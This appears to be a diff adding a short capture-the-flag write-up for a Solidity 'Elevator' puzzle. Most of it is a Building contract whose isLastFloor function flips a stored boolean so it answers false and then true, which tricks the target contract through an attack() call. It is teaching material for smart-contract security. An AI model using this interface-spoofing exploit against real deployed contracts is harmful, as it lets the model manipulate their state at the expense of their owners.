@@ -1,0 +1,19 @@
+We basically have to write a function called isLastFloor that fudges a 
+false on the first check, and a true on the second check. It has to be 
+called isLastFloor and meet all the interface requirements for this to
+work!
+
+So we can just use a bool in memory as part of our isLastFloor function:
+
+contract Building {
+    Elevator public elevator = Elevator([levelAddress]);
+    bool public firstGo = true;
+    
+    function attack() public {
+        elevator.goTo(1);
+    }
+    function isLastFloor(uint) external returns (bool) {
+        firstGo = !firstGo;
+        return firstGo; 
+    }
+}
